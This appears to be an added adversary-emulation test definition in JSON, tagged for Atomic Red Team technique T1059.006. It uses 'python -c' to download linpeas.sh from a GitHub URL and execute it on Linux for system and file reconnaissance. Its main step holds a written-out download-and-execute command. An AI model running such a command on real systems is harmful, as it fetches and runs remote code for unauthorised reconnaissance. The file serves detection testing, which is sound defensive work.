@@ -1,0 +1,123 @@
+{
+  "id": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb",
+  "name": "Execute shell script via python's command mode arguement",
+  "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "6e90753f-0eba-4498-8fb0-30f56f408c68",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9f3e3321-13fe-4b1b-8156-b37b288c9c18",
+      "type": "execute-command",
+      "data": {
+        "command": "rm #{payload_file_name} \n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "16e0c0fc-7692-4183-a68f-0f10cba5ec41",
+      "name": "Check dependency 1/1",
+      "description": "Verify if python is in the environment variable path and attempt to import requests library.",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0b666da6-3d44-4457-ac33-33a13461e8a6",
+      "name": "Resolve dependency 1/1",
+      "description": "Verify if python is in the environment variable path and attempt to import requests library.",
+      "type": "execute-command",
+      "data": {
+        "command": "pip install requests\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "07bc203a-0c92-4bd3-8a8e-d5fa20919265",
+      "name": "Re-check dependency 1/1",
+      "description": "Verify if python is in the environment variable path and attempt to import requests library.",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "6e90753f-0eba-4498-8fb0-30f56f408c68",
+      "p": "on-success",
+      "o": "9f3e3321-13fe-4b1b-8156-b37b288c9c18"
+    },
+    {
+      "s": "6e90753f-0eba-4498-8fb0-30f56f408c68",
+      "p": "on-failure",
+      "o": "9f3e3321-13fe-4b1b-8156-b37b288c9c18"
+    },
+    {
+      "s": "16e0c0fc-7692-4183-a68f-0f10cba5ec41",
+      "p": "on-success",
+      "o": "6e90753f-0eba-4498-8fb0-30f56f408c68"
+    },
+    {
+      "s": "16e0c0fc-7692-4183-a68f-0f10cba5ec41",
+      "p": "on-failure",
+      "o": "0b666da6-3d44-4457-ac33-33a13461e8a6"
+    },
+    {
+      "s": "0b666da6-3d44-4457-ac33-33a13461e8a6",
+      "p": "on-success",
+      "o": "07bc203a-0c92-4bd3-8a8e-d5fa20919265"
+    },
+    {
+      "s": "07bc203a-0c92-4bd3-8a8e-d5fa20919265",
+      "p": "on-failure",
+      "o": "6e90753f-0eba-4498-8fb0-30f56f408c68"
+    }
+  ],
+  "tags": [
+    "T1059.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "payload_file_name",
+      "type": "string",
+      "description": "Name of shell script downloaded from the script_url",
+      "value": "T1059.006-payload"
+    },
+    {
+      "name": "executor",
+      "type": "string",
+      "description": "FreeBSD or Linux shell",
+      "value": "sh"
+    },
+    {
+      "name": "script_args",
+      "type": "string",
+      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
+      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
+    },
+    {
+      "name": "script_url",
+      "type": "string",
+      "description": "Shell script public URL",
+      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
+    }
+  ]
+}
